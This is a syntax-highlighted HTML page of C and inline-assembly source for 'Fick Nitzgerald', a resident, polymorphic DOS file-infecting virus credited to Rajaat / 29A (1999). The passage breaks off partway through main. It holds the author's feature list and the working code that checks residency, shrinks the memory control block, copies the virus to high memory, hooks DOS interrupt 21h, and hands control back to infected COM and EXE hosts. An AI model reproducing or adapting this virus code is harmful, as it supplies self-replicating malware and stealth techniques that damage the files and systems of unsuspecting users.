<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Fick.7326 - ficknitz.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/*****( Fick Nitzgerald Virus by Rajaat / 29A )********************************
*
* Virus name    : Fick Nitzgerald
* Author        : Rajaat / 29A
* Origin        : United Kingdom, January 1999
* Compiling     : Use the included batch file.
*                 Borland C++ 3.1 and Turbo Assembler required
* Targets       : COM &amp; EXE files
* Size          : 1st generation = 6694 bytes
*                 Others are 7326 bytes
* Resident      : Yes
* Polymorphic   : Yes
* Encrypted     : No
* Stealth       : File size stealth on 11/12 and 4e/4f
* Tunneling     : No
* Retrovirus    : Yes, it is not easy to research a HLL virus :-)
* Antiheuristics: Not deliberately, but I think it will pass some checks
* Peculiarities : It's mainly written in Borland C++ 3.1 with some alterations
*                 to the startup code of the "tiny model" code (C0.ASM) and
*                 inline assembly.
* Drawbacks     : Extensive debugging needed and thorough knowledge of
*                 compilers and how they work. This virus has been written
*                 in a timespan of almost 3 years (started in March 1996).
* Behaviour     : When an infected file is executed the virus first will
*                 relocate it's code to a segment boundary, so that it
*                 is always aligned at CS:0100, no matter where it
*                 resides. If the file is not a first generation sample,
*                 it will also have a polymorphic decryptor before
*                 realigning takes place. Afther that the virus will
*                 check if it is already resident by issueing its
*                 "are-you-there" call. If it is not resident, it will
*                 find the last MCB, shrink it, and moves its code to
*                 the top of memory. Then it will hook DOS interrupt.
*                 After the virus has installed itself in memory, it
*                 will return control to the host. After the host
*                 recieves control, the virus will try to infect COM and
*                 EXE files that are opened or executed. If the virus
*                 can infect the file, it tries to allocate a block of
*                 memory as buffer for its polymorphic engine. If it
*                 can't allocate the memory it will attach the virus
*                 unencrypted at the end of the host file. If the virus
*                 can have enough memory it will call it's engine and
*                 writes the virus at the end of the host file.
*                 Furthermore, when the virus is resident it will hide
*                 the increase in filelength by monitoring the
*                 FindFirst/FindNext (11/12/4e/4f) of DOS. I do realise
*                 that the virus has become quite big in length, thats
*                 the sacrifice I had to make for writing a virus in C.
*
*                 It's unknown what this virus might do besides replicate :)
*
* Ps.             This is my last virus I've written as 29A member, I hereby
*                 want to thank the others for their friendship and support.
*
*                 Btw, please read the attached text to support me in writing
*                 new things.
*
*
******************************************************************************/</span><span class="sc0">


</span><span class="sc9">#pragma inline                          </span><span class="sc2">// sorry, some assembly is needed
</span><span class="sc0">
</span><span class="sc2">// Include some libraries I use
</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;ctype.h&gt;
#include &lt;conio.h&gt;
#include &lt;dos.h&gt;
#include &lt;dir.h&gt;
#include &lt;mem.h&gt;
#include &lt;io.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define BreakPoint asm int 3;           </span><span class="sc2">// Included for testing purposes
</span><span class="sc0">
</span><span class="sc9">#define PING 0x30DE                     </span><span class="sc2">// are-you-there query
</span><span class="sc9">#define PONG 0xB00B                     </span><span class="sc2">// are-you-there response
</span><span class="sc9">#define DOSINT 0x21                     </span><span class="sc2">// take a guess
</span><span class="sc0">
</span><span class="sc9">#define virus_stealth_size 7326         </span><span class="sc2">// 11*0x29a (666)
</span><span class="sc0">
</span><span class="sc2">// Some typedefs to make my life easier
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">BYTE</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// Bytes
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">  </span><span class="sc11">WORD</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// Words
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// Doublewords
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ffblk</span><span class="sc0"> </span><span class="sc11">far</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">findrec</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// Needed for 4e/4f stealth
</span><span class="sc0">
</span><span class="sc2">// Needed for 11/12 stealth
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirblk</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">db_drive</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">db_name</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">db_ext</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">db_attrib</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">db_reserved1</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">db_time</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">db_date</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">db_start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">db_filesize</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">far</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dirrec</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">// The infamous EXE header :-!
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">exe_header</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_id</span><span class="sc10">;</span><span class="sc0">                        </span><span class="sc2">// 0000
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_last_page</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// 0002
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_pages</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">// 0004
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_rel_cnt</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// 0006
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_hdr_size</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc2">// 0008
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_min_mem</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// 000A
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_max_mem</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// 000C
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_SS</span><span class="sc10">;</span><span class="sc0">                        </span><span class="sc2">// 000E
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_SP</span><span class="sc10">;</span><span class="sc0">                        </span><span class="sc2">// 0010
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_crc</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc2">// 0012
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_IP</span><span class="sc10">;</span><span class="sc0">                        </span><span class="sc2">// 0014
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_CS</span><span class="sc10">;</span><span class="sc0">                        </span><span class="sc2">// 0016
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_ofs_reloc</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// 0018     also NEWexe check
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_overlay</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// 001A     must be 0
</span><span class="sc0">    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">exe_4bytes</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// 001C
</span><span class="sc0">    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">exe_behaviour</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// 0020
</span><span class="sc0">    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">exe_reserved</span><span class="sc10">[</span><span class="sc4">25</span><span class="sc10">];</span><span class="sc0">              </span><span class="sc2">// 0022
</span><span class="sc0">    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">exe_offset_NE</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// 003C     SHOULD be 0
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">exe_header</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">// I need to call some interrupts, and using C these two are needed
</span><span class="sc16">union</span><span class="sc0"> </span><span class="sc11">REGS</span><span class="sc0"> </span><span class="sc11">regs</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">SREGS</span><span class="sc0"> </span><span class="sc11">segregs</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">DSEG</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc2">// DS, in C0.ASM and needed
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc11">near</span><span class="sc0"> </span><span class="sc11">virus_start</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// Start of the virus (in C0.ASM)
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc11">near</span><span class="sc0"> </span><span class="sc11">virus_end</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc2">// End of the virus (in C0.ASM)
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">pspseg</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">// Segment of PSP (in C0.ASM)
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fse</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">                  </span><span class="sc2">// The poly engine (FSE.ASM)
</span><span class="sc0">
</span><span class="sc2">// Some prototyping here (hey, it's C!)
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_virus_size</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_virus_memory</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_virus_paragraphs</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">interrupt</span><span class="sc0"> </span><span class="sc11">int_21_handler</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">di</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">es</span><span class="sc10">,</span><span class="sc0">
                              </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dx</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">,</span><span class="sc0">
                              </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// The old int 0x21 pointer is stored here
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">interrupt</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">old_int_21</span><span class="sc10">)(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// The stack and start of an infected EXE file
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">host_sp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">host_ss</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">host_ip</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">host_cs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">// The jump and infection marker for a COM file
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">newbytes</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0xE9</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'!'</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc2">// The original 1st 4 bytes of a COM host (in this case return to DOS)
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">org4bytes</span><span class="sc10">[</span><span class="sc4">0x4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0xCD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x5B</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc2">// Buffer for reading the exe header
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">exe_header</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">// And here some boasting :-D
// Oh hell, I spelled his name wrong!
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">virname</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[ Fick Nitzgerald Virus ]"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">author</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[ Rajaat / 29A ]"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">// EXE &amp; COM entrypoint
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">srcseg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">srcofs</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">seg</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ofs</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">_fmode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">  </span><span class="sc11">O_BINARY</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// filemode always binary
</span><span class="sc0">    </span><span class="sc11">old_int_21</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getvect</span><span class="sc10">(</span><span class="sc11">DOSINT</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// get dos int 21h ptr
</span><span class="sc0">
    </span><span class="sc11">regs</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">.</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PING</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// Check if already resident
</span><span class="sc0">    </span><span class="sc11">regs</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">.</span><span class="sc11">bx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PONG</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">int86</span><span class="sc10">(</span><span class="sc11">DOSINT</span><span class="sc10">,&amp;</span><span class="sc11">regs</span><span class="sc10">,&amp;</span><span class="sc11">regs</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">regs</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">.</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">PONG</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">regs</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">.</span><span class="sc11">bx</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">PING</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc2">// Install resident
</span><span class="sc0">        </span><span class="sc19">seg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getpsp</span><span class="sc10">()-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// get current mcb
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">peekb</span><span class="sc10">(</span><span class="sc19">seg</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'Z'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">poke</span><span class="sc10">(</span><span class="sc19">seg</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">,(</span><span class="sc11">peek</span><span class="sc10">(</span><span class="sc19">seg</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)-(</span><span class="sc11">get_virus_memory</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">poke</span><span class="sc10">(</span><span class="sc19">seg</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">,(</span><span class="sc11">peek</span><span class="sc10">(</span><span class="sc19">seg</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">)-(</span><span class="sc11">get_virus_memory</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc2">// nick now has enough memory at the top of dos memory
</span><span class="sc0">            </span><span class="sc19">seg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">peek</span><span class="sc10">(</span><span class="sc19">seg</span><span class="sc10">,</span><span class="sc4">0x12</span><span class="sc10">)-</span><span class="sc4">0x10</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ofs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">srcseg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">srcofs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">virus_start</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">movedata</span><span class="sc10">(</span><span class="sc11">srcseg</span><span class="sc10">,</span><span class="sc11">srcofs</span><span class="sc10">,</span><span class="sc19">seg</span><span class="sc10">,</span><span class="sc11">ofs</span><span class="sc10">,</span><span class="sc11">get_virus_size</span><span class="sc10">());</span><span class="sc0">   </span><span class="sc2">// move virus
</span><span class="sc0">
            </span><span class="sc2">// hook dos int 21h
</span><span class="sc0">            </span><span class="sc11">regs</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">.</span><span class="sc11">ax</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x2521</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">regs</span><span class="sc10">.</span><span class="sc11">x</span><span class="sc10">.</span><span class="sc11">dx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FP_OFF</span><span class="sc10">(</span><span class="sc11">int_21_handler</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">segregs</span><span class="sc10">.</span><span class="sc11">ds</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc19">seg</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">int86x</span><span class="sc10">(</span><span class="sc11">DOSINT</span><span class="sc10">,&amp;</span><span class="sc11">regs</span><span class="sc10">,&amp;</span><span class="sc11">regs</span><span class="sc10">,&amp;</span><span class="sc11">segregs</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">poke</span><span class="sc10">(</span><span class="sc19">seg</span><span class="sc10">,&amp;</span><span class="sc11">DSEG</span><span class="sc10">,</span><span class="sc19">seg</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">org4bytes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'M'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">org4bytes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'Z'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// Return to EXE host
</span><span class="sc0">    </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">ah</span><span class="sc10">,</span><span class="sc4">0x51</span><span class="sc0">
      </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">0x21</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">es</span><span class="sc10">,</span><span class="sc11">bx</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc10">,</span><span class="sc11">bx</span><span class="sc0">
      </span><span class="sc11">add</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc10">,</span><span class="sc11">bx</span><span class="sc0">
      </span><span class="sc11">add</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc10">,</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">:[</span><span class="sc11">host_ss</span><span class="sc10">]</span><span class="sc0">
      </span><span class="sc11">add</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc10">,</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">:[</span><span class="sc11">host_cs</span><span class="sc10">]</span><span class="sc0">
      </span><span class="sc11">cli</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">ss</span><span class="sc10">,</span><span class="sc11">cx</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">sp</span><span class="sc10">,</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">:[</span><span class="sc11">host_sp</span><span class="sc10">]</span><span class="sc0">
      </span><span class="sc11">sti</span><span class="sc0">
      </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc10">,</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">:[</span><span class="sc11">host_ip</span><span class="sc10">]</span><span class="sc0">
      </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc0">
      </span><span class="sc11">xor</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc10">,</span><span class="sc11">bx</span><span class="sc0">
      </span><span class="sc11">xor</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">,</span><span class="sc11">ax</span><span class="sc0">
      </span><span class="sc11">retf</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// Return to COM host
</span><span class="sc0">    </span><span class="sc11">movedata</span><span class="sc10">(</span><span class="sc11">_CS</span><span class="sc10">,</span><span class="sc11">FP_OFF</span><span class="sc10">(</span><span class="sc11">org4bytes</span><span class="sc10">),</span><span class="sc11">pspseg</span><span class="sc10">,</span><span class="sc4">0x100</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc10">,</span><span class="sc11">pspseg</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">ss</span><span class="sc10">,</span><span class="sc11">ax</span><span class="sc0">
      </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc10">,</span><span class="sc11">ax</span><span class="sc0">
